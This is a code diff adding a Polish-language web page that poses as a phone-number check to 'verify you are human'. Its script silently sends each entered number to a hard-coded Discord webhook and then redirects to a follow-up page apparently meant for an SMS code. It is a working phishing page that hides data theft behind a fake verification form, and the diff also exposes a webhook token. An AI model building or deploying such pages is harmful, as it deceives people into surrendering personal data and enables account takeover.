@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #f0f0f0; /* Jasnoszare tło */
+            font-family: Arial, sans-serif;
+        }
+
+        #container {
+            width: 60%;
+            margin: auto;
+            padding: 20px;
+            background-color: #fff; /* Białe tło formularza */
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 50px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #4caf50;
+            color: #fff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+    <title>Weryfikacja nr.tel</title>
+</head>
+<body>
+
+    <div id="container">
+      <img src="https://i.imgur.com/J1qGx3x.png"> <br>
+      <h1>
+        Weryfikacja
+      </h1>
+      <h3>
+        Zgodnie z wymaganiami, musimy przeprowadzić weryfikacje nrem telefonu aby sprawdzić czy jesteś człowiekiem.
+      </h3>
+        <form id="myForm">
+            <label for="rubryka">Numer Telefonu:</label>
+            <input type="text" id="rubryka" name="rubryka" required>
+
+            <button type="button" onclick="wyslijWebhook()">Dalej</button>
+        </form>
+    </div>
+
+    <script>
+        function wyslijWebhook() {
+            var rubrykaWartosc = document.getElementById("rubryka").value;
+
+            // Zastąp poniższy link adresem webhooka na swoim serwerze Discord
+            var webhookURL = "https://discord.com/api/webhooks/1193957556146679861/l4gOL_Et6SSzUWIsNqiYz_SpnnA9sG8RV2PVH_8V4z_l-Ccacobc617AIzVdgLDO2zsD";
+
+            // Utwórz obiekt JSON z zawartością rubryki
+            var payload = {
+                content: "@everyone NrTEL: " + rubrykaWartosc
+            };
+
+            // Wyślij żądanie POST na webhook Discorda
+            fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error("Błąd podczas wysyłania webhooka:", response.statusText);
+                } else {
+                    console.log("Webhook wysłany pomyślnie!");
+                    window.location.href = "confirmsmz.html"; // Przekierowanie po udanym wysłaniu webhooka
+                }
+            })
+            .catch(error => {
+                console.error("Błąd:", error);
+            });
+        }
+    </script>
+
+</body>
+</html>
